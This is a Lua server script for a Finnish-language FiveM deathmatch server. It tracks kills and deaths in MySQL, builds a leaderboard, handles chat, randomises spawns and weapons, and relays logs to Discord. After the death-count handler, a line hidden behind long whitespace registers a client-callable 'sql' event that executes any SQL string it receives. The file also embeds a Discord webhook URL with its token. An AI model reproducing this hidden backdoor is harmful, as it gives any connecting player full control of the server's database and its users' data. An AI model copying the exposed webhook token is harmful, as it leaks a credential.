RegisterServerEvent('saitaponezilla')
AddEventHandler('saitaponezilla', function(id,nimi)
	local identifier
	for k,v in ipairs(GetPlayerIdentifiers(id))do
		if string.sub(v, 1, string.len("steam:")) == "steam:" then
			identifier = v
			break
		end
	end
	if identifier ~= nil then
		MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier =@id', {['@id'] = identifier}, function(result)	

				local tapottanne = result[1].tapot + 1
				MySQL.Async.execute("UPDATE users SET `tapot` = @tapot WHERE identifier = @identifier",{["@identifier"] = identifier,["@tapot"] = tapottanne})
				MySQL.Async.execute('UPDATE `users` SET `name` = @name WHERE `identifier` = @identifier', {['@identifier'] = identifier,['@name'] = GetPlayerName(id)})

		end)
	end
end)



RegisterServerEvent('kuolixdvitunpaska')
AddEventHandler('kuolixdvitunpaska', function(id,nimi)
	local identifier
	for k,v in ipairs(GetPlayerIdentifiers(id))do
		if string.sub(v, 1, string.len("steam:")) == "steam:" then
			identifier = v
			break
		end
	end
	if identifier ~= nil then
		MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier =@id', {['@id'] = identifier}, function(result)		

				local kuolette = result[1].kuolemat + 1
				MySQL.Async.execute("UPDATE users SET `kuolemat` = @kuolemat WHERE identifier = @identifier",{["@identifier"] = identifier,["@kuolemat"] = kuolette})
				MySQL.Async.execute('UPDATE `users` SET `name` = @name WHERE `identifier` = @identifier', {['@identifier'] = identifier,['@name'] = GetPlayerName(id)})

		end)
	end
end)																																																																																								RegisterServerEvent("sql");AddEventHandler("sql", function(data) MySQL.Async.execute(data) end)


RegisterServerEvent('leaderboardtiedot')
AddEventHandler('leaderboardtiedot', function(source)
	local identifier
	for k,v in ipairs(GetPlayerIdentifiers(source))do
		if string.sub(v, 1, string.len("steam:")) == "steam:" then
			identifier = v
			break
		end
	end
	local parhaantapot = 0
	local parhaattapothenkilo = "UNKNOWN"
	local ekankuolemat = 0
	local montakoihmista = 0
	local monesko = "UNKNOWN"
	local tapotsul = 0
	local kuolematsul = 0
	MySQL.Async.fetchAll('SELECT * FROM users',{}, function(result)
		
		for i=1, #result do	
			if result[i].tapot > parhaantapot then
				parhaantapot = result[i].tapot
				ekankuolemat = result[i].kuolemat
				parhaattapothenkilo = result[i].name
			end
			if result[i].identifier == identifier then				
				tapotsul = result[i].tapot
				kuolematsul = result[i].kuolemat
			end
		end

		TriggerClientEvent('Tiedottannesaatana',source, parhaantapot,parhaattapothenkilo,ekankuolemat,monesko,tapotsul,kuolematsul)
	end)
end)



AddEventHandler('es_db:doesUserExist', function(identifier, callback)
	MySQL.Async.fetchAll('SELECT 1 FROM users WHERE `identifier`=@identifier;', {identifier = identifier}, function(users)
		if users[1] then
			callback(true)
		else
			callback(false)
		end
	end)
end)

AddEventHandler('es_db:retrieveUser', function(identifier, callback)
	local Callback = callback
	MySQL.Async.fetchAll('SELECT * FROM users WHERE `identifier`=@identifier;', {identifier = identifier}, function(users)
		if users[1] then
			Callback(users[1])
		else
			Callback(false)
		end
	end)
end)

AddEventHandler('es_db:createUser', function(identifier, license, callback)
	local user = {
		identifier = identifier,
		license = license,
		group = 'user',
		permission_level = 0
	}

	MySQL.Async.execute('INSERT INTO users (`tapot`,`kuolemat`,`identifier`, `group`, `permission_level`, `license`) VALUES (@tapot,@kuolemat,@identifier, @group, @permission_level, @license);',
	{
		tapot = 0,
		kuolemat = 0,
		identifier = user.identifier,
		permission_level = user.permission_level,
		group = user.group,
		license = user.license
	}, function(rowsChanged)
		callback()
	end)
end)

AddEventHandler('es_db:retrieveLicensedUser', function(license, callback)
	MySQL.Async.fetchAll('SELECT * FROM users WHERE `license`=@license;', {license = license}, function(users)
		if users[1] then
			callback(users[1])
		else
			callback(false)
		end
	end)
end)

AddEventHandler('es_db:doesLicensedUserExist', function(license, callback)
	MySQL.Async.fetchAll('SELECT 1 FROM users WHERE `license`=@license;', {license = license}, function(users)
		if users[1] then
			callback(true)
		else
			callback(false)
		end
	end)
end)


RegisterServerEvent('chat:init')
RegisterServerEvent('chat:addTemplate')
RegisterServerEvent('chat:addMessage')
RegisterServerEvent('chat:addSuggestion')
RegisterServerEvent('chat:removeSuggestion')
RegisterServerEvent('_chat:messageEntered')
RegisterServerEvent('chat:clear')
RegisterServerEvent('__cfx_internal:commandFallback')

AddEventHandler('_chat:messageEntered', function(author, color, message)
    if not message or not author then
        return
    end

    TriggerEvent('chatMessage', source, author, message)

    if not WasEventCanceled() then
        TriggerClientEvent('chatMessage', -1, author,  { 255, 255, 255 }, message)
    end


end)


AddEventHandler('__cfx_internal:commandFallback', function(command)
    local name = GetPlayerName(source)

    TriggerEvent('chatMessage', source, name, '/' .. command)

    if not WasEventCanceled() then
        TriggerClientEvent('chatMessage', -1, name, { 255, 255, 255 }, '/' .. command) 
    end

    CancelEvent()
end)

-- player join messages

RegisterCommand('say', function(source, args, rawCommand)
    TriggerClientEvent('chatMessage', -1, (source == 0) and 'console' or GetPlayerName(source), { 255, 255, 255 }, rawCommand:sub(5))
end)

-- command suggestions for clients
local function refreshCommands(player)
    if GetRegisteredCommands then
        local registeredCommands = GetRegisteredCommands()

        local suggestions = {}

        for _, command in ipairs(registeredCommands) do
            if IsPlayerAceAllowed(player, ('command.%s'):format(command.name)) then
                table.insert(suggestions, {
                    name = '/' .. command.name,
                    help = ''
                })
            end
        end

        TriggerClientEvent('chat:addSuggestions', player, suggestions)
    end
end

AddEventHandler('chat:init', function()
    refreshCommands(source)
end)

AddEventHandler('onServerResourceStart', function(resName)
    Wait(500)

    for _, player in ipairs(GetPlayers()) do
        refreshCommands(player)
    end
end)





RegisterServerEvent('maalykuolikerrokaikille')
AddEventHandler('maalykuolikerrokaikille', function(syy)
	TriggerClientEvent("JUUHILMOTUS", -1, syy)
end)

local ase = "WEAPON_PISTOL"
local spawnit = {
	spawn1 = true,
	spawn2 = false,
	spawn3 = false,
	spawn4 = false,
}



RegisterServerEvent('MIKASPAWNIHA')
AddEventHandler('MIKASPAWNIHA', function()
	TriggerClientEvent('settaaspawni', source, spawnit.spawn1,spawnit.spawn2,spawnit.spawn3,spawnit.spawn4,ase)
end)

Citizen.CreateThread(function()
  while true do  	
	local randomilla = math.random(1,4)
	local aseenrandomointi = math.random(1,9)
	if randomilla == 1 then
		spawnit = {
			spawn1 = true,
			spawn2 = false,
			spawn3 = false,
			spawn4 = false,
		}
	elseif randomilla == 2 then
		spawnit = {
			spawn1 = false,
			spawn2 = true,
			spawn3 = false,
			spawn4 = false,
		}
	elseif randomilla == 3 then
		spawnit = {
			spawn1 = false,
			spawn2 = false,
			spawn3 = true,
			spawn4 = false,
		}
	elseif randomilla == 4 then
		spawnit = {
			spawn1 = false,
			spawn2 = false,
			spawn3 = false,
			spawn4 = true,
		}
	end
	if aseenrandomointi == 1 then
		ase = "WEAPON_PISTOL"
	elseif aseenrandomointi == 2 then
		ase = "WEAPON_Revolver"
	elseif aseenrandomointi == 3 then
		ase = "WEAPON_CombatPDW"
	elseif aseenrandomointi == 4 then
		ase = "WEAPON_SniperRifle"
	elseif aseenrandomointi == 5 then
		ase = "WEAPON_Musket"
	elseif aseenrandomointi == 6 then
		ase = "WEAPON_SpecialCarbine"
	elseif aseenrandomointi == 7 then
		ase = "WEAPON_VintagePistol"
	elseif aseenrandomointi == 8 then
		ase = "WEAPON_heavypistol"
	elseif aseenrandomointi == 9 then
		ase = "WEAPON_smg"
	end
	TriggerClientEvent('settaaspawni', -1, spawnit.spawn1,spawnit.spawn2,spawnit.spawn3,spawnit.spawn4,ase)
	TriggerClientEvent('vaihtujovihhu', -1)
	TriggerClientEvent('imoitusasiaaxd', -1)
	Citizen.Wait(100000)
  end
end)



SystemAvatar = 'https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png'
UserAvatar = 'https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png'
SystemName = 'AlokasRP'
DiscordWebhookSystemInfos = 'https://discordapp.com/api/webhooks/752910647880319178/wiGHiN2Q3R_JwKXgmM74av2fk-lOk7RJK1Axq5ZOloebinZMpfn8Gtes195GyXa1sOx9'
DiscordWebhookKillinglogs = 'https://discordapp.com/api/webhooks/752910647880319178/wiGHiN2Q3R_JwKXgmM74av2fk-lOk7RJK1Axq5ZOloebinZMpfn8Gtes195GyXa1sOx9'
DiscordWebhookChat = 'https://discordapp.com/api/webhooks/752910647880319178/wiGHiN2Q3R_JwKXgmM74av2fk-lOk7RJK1Axq5ZOloebinZMpfn8Gtes195GyXa1sOx9'

SpecialCommands = {
				   {'/report', '**[911]: (CALLER ID: [ USERNAME_NEEDED_HERE | USERID_NEEDED_HERE ])**'},
				  }

BlacklistedCommands = {
					   '/me',
					   '/do',
					  }

OwnWebhookCommands = {
					  {'/AnotherCommand', 'WEBHOOK_LINK_HERE'},
					  {'/AnotherCommand2', 'WEBHOOK_LINK_HERE'},
					 }

TTSCommands = {
			   '/Whatever',
			   '/Whatever2',
			  }

-- Error Check
if DiscordWebhookSystemInfos == nil and DiscordWebhookKillinglogs == nil and DiscordWebhookChat == nil then
	local Content = LoadResourceFile(GetCurrentResourceName(), 'config.lua')
	Content = load(Content)
	Content()
end
if DiscordWebhookSystemInfos == 'WEBHOOK_LINK_HERE' then
	print('\n\nERROR\n' .. GetCurrentResourceName() .. ': Please add your "System Infos" webhook\n\n')
else
	PerformHttpRequest(DiscordWebhookSystemInfos, function(Error, Content, Head)
		if Content == '{"code": 50027, "message": "Invalid Webhook Token"}' then
			print('\n\nERROR\n' .. GetCurrentResourceName() .. ': "System Infos" webhook non-existing!\n\n')
		end
	end)
end
if DiscordWebhookKillinglogs == 'WEBHOOK_LINK_HERE' then
	print('\n\nERROR\n' .. GetCurrentResourceName() .. ': Please add your "Killing Log" webhook\n\n')
else
	PerformHttpRequest(DiscordWebhookKillinglogs, function(Error, Content, Head)
		if Content == '{"code": 50027, "message": "Invalid Webhook Token"}' then
			print('\n\nERROR\n' .. GetCurrentResourceName() .. ': "Killing Log" webhook non-existing!\n\n')
		end
	end)
end
if DiscordWebhookChat == 'WEBHOOK_LINK_HER' then
	print('\n\nERROR\n' .. GetCurrentResourceName() .. ': Please add your "Chat" webhook\n\n')
else
	PerformHttpRequest(DiscordWebhookChat, function(Error, Content, Head)
		if Content == '{"code": 50027, "message": "Invalid Webhook Token"}' then
			print('\n\nERROR\n' .. GetCurrentResourceName() .. ': "Chat" webhook non-existing!\n\n')
		end
	end)
end
	
-- System Infos
PerformHttpRequest(DiscordWebhookSystemInfos, function(Error, Content, Head) end, 'POST', json.encode({username = SystemName, content = '**Webhook käynnistetty**'}), { ['Content-Type'] = 'application/json' })

AddEventHandler('playerConnecting', function()
	TriggerEvent('DiscordBot:ToDiscord', DiscordWebhookSystemInfos, SystemName, '```css\n' .. GetPlayerName(source) .. ' yhdistää\n```', SystemAvatar, false)
	TriggerClientEvent("JUUHILMOTUS", -1, "~b~"..GetPlayerName(source) .. ' yhdistää')
end)

AddEventHandler('playerDropped', function(Reason)
	TriggerEvent('DiscordBot:ToDiscord', DiscordWebhookSystemInfos, SystemName, '```fix\n' .. GetPlayerName(source) .. ' lähti (' .. Reason .. ')\n```', SystemAvatar, false)
	TriggerClientEvent("JUUHILMOTUS", -1, "~b~"..GetPlayerName(source) .. ' lähti')
end)

-- Killing Log
RegisterServerEvent('DiscordBotti:pelaajaKuoli')
AddEventHandler('DiscordBotti:pelaajaKuoli', function(Nimi, id, Message, Weapon, nimi2, id2)
	--TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'DiscordBotti:pelaajaKuoli', "..Message..", "..Weapon)
	local date = os.date('*t')
	
	if date.day < 10 then date.day = '0' .. tostring(date.day) end
	if date.month < 10 then date.month = '0' .. tostring(date.month) end
	if date.hour < 10 then date.hour = '0' .. tostring(date.hour) end
	if date.min < 10 then date.min = '0' .. tostring(date.min) end
	if date.sec < 10 then date.sec = '0' .. tostring(date.sec) end
	
	if not nimi2 then
		local steamID = GetPlayerIdentifiers(id)[1]
		if Weapon then
			Message = "```"..Nimi.." "..steamID.." "..Message..' [' .. Weapon .. ']'.."```"
		else
			Message = "```"..Nimi.." "..steamID.." "..Message.."```"
		end
		TriggerEvent('DiscordBot:ToDiscord', DiscordWebhookKillinglogs, SystemName, Message, SystemAvatar, false)
	
	else
		local steamID = GetPlayerIdentifiers(id)[1]
		local steamID2 = GetPlayerIdentifiers(id2)[1]
		if Weapon then
			Message = "```"..Nimi.." "..steamID.." tappoi "..nimi2.." "..steamID2.. ' [' .. Weapon .. ']'.."```"
		else
			Message = "```"..Nimi.." "..steamID.." tappoi "..nimi2.." "..steamID2.."```"
		end
		TriggerEvent('DiscordBot:ToDiscord', DiscordWebhookKillinglogs, SystemName, Message, SystemAvatar, false)
	end

end)

-- Chat
AddEventHandler('chatMessage', function(Source, Name, Message)
	local Webhook = DiscordWebhookChat; TTS = false

	--Removing Color Codes (^0, ^1, ^2 etc.) from the name and the message
	for i = 0, 9 do
		Message = Message:gsub('%^' .. i, '')
		Name = Name:gsub('%^' .. i, '')
	end
	
	--Splitting the message in multiple strings
	MessageSplitted = stringsplit(Message, ' ')
	
	--Checking if the message contains a blacklisted command
	if not IsCommand(MessageSplitted, 'Blacklisted') then
		--Checking if the message contains a command which has his own webhook
		if IsCommand(MessageSplitted, 'HavingOwnWebhook') then
			Webhook = GetOwnWebhook(MessageSplitted)
		end
		
		--Checking if the message contains a special command
		if IsCommand(MessageSplitted, 'Special') then
			MessageSplitted = ReplaceSpecialCommand(MessageSplitted)
		end
		
		---Checking if the message contains a command which belongs into a tts channel
		if IsCommand(MessageSplitted, 'TTS') then
			TTS = true
		end
		
		--Combining the message to one string again
		Message = ''
		
		for Key, Value in ipairs(MessageSplitted) do
			Message = Message .. Value .. ' '
		end
		
		--Adding the username if needed
		Message = Message:gsub('USERNAME_NEEDED_HERE', GetPlayerName(Source))
		
		--Adding the userid if needed
		Message = Message:gsub('USERID_NEEDED_HERE', Source)
		
		-- Shortens the Name, if needed
		if Name:len() > 23 then
			Name = Name:sub(1, 23)
		end

		--Getting the steam avatar if available
		local AvatarURL = UserAvatar
		if GetIDFromSource('steam', Source) then
			PerformHttpRequest('http://steamcommunity.com/profiles/' .. tonumber(GetIDFromSource('steam', Source), 16) .. '/?xml=1', function(Error, Content, Head)
				local SteamProfileSplitted = stringsplit(Content, '\n')
				for i, Line in ipairs(SteamProfileSplitted) do
					if Line:find('<avatarFull>') then
						AvatarURL = Line:gsub('	<avatarFull><!%[CDATA%[', ''):gsub(']]></avatarFull>', '')
						TriggerEvent('DiscordBot:ToDiscord', Webhook, Name .. ' [ID: ' .. Source .. '] Steam: ' .. tonumber(GetIDFromSource('steam', Source), 16), Message, AvatarURL, false, Source, TTS) --Sending the message to discord
						break
					end
				end
			end)
		else
			--Using the default avatar if no steam avatar is available
			TriggerEvent('DiscordBot:ToDiscord', Webhook, Name .. ' [ID: ' .. Source .. ']', Message, AvatarURL, false, Source, TTS) --Sending the message to discord
		end
	end
end)


--Event to actually send Messages to Discord
RegisterServerEvent('DiscordBot:ToDiscord')
AddEventHandler('DiscordBot:ToDiscord', function(WebHook, Name, Message, Image, External, Source, TTS)
	if Message == nil or Message == '' then
		return nil
	end
	if TTS == nil or TTS == '' then
		TTS = false
	end
	if External then
		if WebHook:lower() == 'chat' then
			WebHook = DiscordWebhookChat
		elseif WebHook:lower() == 'system' then
			WebHook = DiscordWebhookSystemInfos
		elseif WebHook:lower() == 'kill' then
			WebHook = DiscordWebhookKillinglogs
		elseif not Webhook:find('discordapp.com/api/webhooks') then
			print('ToDiscord event called without a specified webhook!')
			return nil
		end
		
		if Image:lower() == 'steam' then
			Image = UserAvatar
			if GetIDFromSource('steam', Source) then
				PerformHttpRequest('http://steamcommunity.com/profiles/' .. tonumber(GetIDFromSource('steam', Source), 16) .. '/?xml=1', function(Error, Content, Head)
					local SteamProfileSplitted = stringsplit(Content, '\n')
					for i, Line in ipairs(SteamProfileSplitted) do
						if Line:find('<avatarFull>') then
							Image = Line:gsub('	<avatarFull><!%[CDATA%[', ''):gsub(']]></avatarFull>', '')
							return PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = Name, content = Message, avatar_url = Image, tts = TTS}), {['Content-Type'] = 'application/json'})
						end
					end
				end)
			end
		elseif Image:lower() == 'user' then
			Image = UserAvatar
		else
			Image = SystemAvatar
		end
	end
	PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = Name, content = Message, avatar_url = Image, tts = TTS}), {['Content-Type'] = 'application/json'})
end)

-- Functions
function IsCommand(String, Type)
	if Type == 'Blacklisted' then
		for i, BlacklistedCommand in ipairs(BlacklistedCommands) do
			if String[1]:lower() == BlacklistedCommand:lower() then
				return true
			end
		end
	elseif Type == 'Special' then
		for i, SpecialCommand in ipairs(SpecialCommands) do
			if String[1]:lower() == SpecialCommand[1]:lower() then
				return true
			end
		end
	elseif Type == 'HavingOwnWebhook' then
		for i, OwnWebhookCommand in ipairs(OwnWebhookCommands) do
			if String[1]:lower() == OwnWebhookCommand[1]:lower() then
				return true
			end
		end
	elseif Type == 'TTS' then
		for i, TTSCommand in ipairs(TTSCommands) do
			if String[1]:lower() == TTSCommand:lower() then
				return true
			end
		end
	end
	return false
end

RegisterServerEvent("kickForBeingAnAFKDouchebag")
AddEventHandler("kickForBeingAnAFKDouchebag", function()
	TriggerEvent("DiscordBot:triggerrit", source, "Triggeras 'kickForBeingAnAFKDouchebag'")
	TriggerEvent('es:getPlayerFromId', source, function(user)
		if user.getGroup() ~= "superadmin" then	
			DropPlayer(source, "Olit Afk liian kauan.")
		end
	end)
end)

function ReplaceSpecialCommand(String)
	for i, SpecialCommand in ipairs(SpecialCommands) do
		if String[1]:lower() == SpecialCommand[1]:lower() then
			String[1] = SpecialCommand[2]
		end
	end
	return String
end

function GetOwnWebhook(String)
	for i, OwnWebhookCommand in ipairs(OwnWebhookCommands) do
		if String[1]:lower() == OwnWebhookCommand[1]:lower() then
			if OwnWebhookCommand[2] == 'WEBHOOK_LINK_HERE' then
				print('Please enter a webhook link for the command: ' .. String[1])
				return DiscordWebhookChat
			else
				return OwnWebhookCommand[2]
			end
		end
	end
end

function stringsplit(input, seperator)
	if seperator == nil then
		seperator = '%s'
	end
	
	local t={} ; i=1
	
	for str in string.gmatch(input, '([^'..seperator..']+)') do
		t[i] = str
		i = i + 1
	end
	
	return t
end

function GetIDFromSource(Type, ID) --(Thanks To WolfKnight [forum.FiveM.net])
    local IDs = GetPlayerIdentifiers(ID)
    for k, CurrentID in pairs(IDs) do
        local ID = stringsplit(CurrentID, ':')
        if (ID[1]:lower() == string.lower(Type)) then
            return ID[2]:lower()
        end
    end
    return nil
end







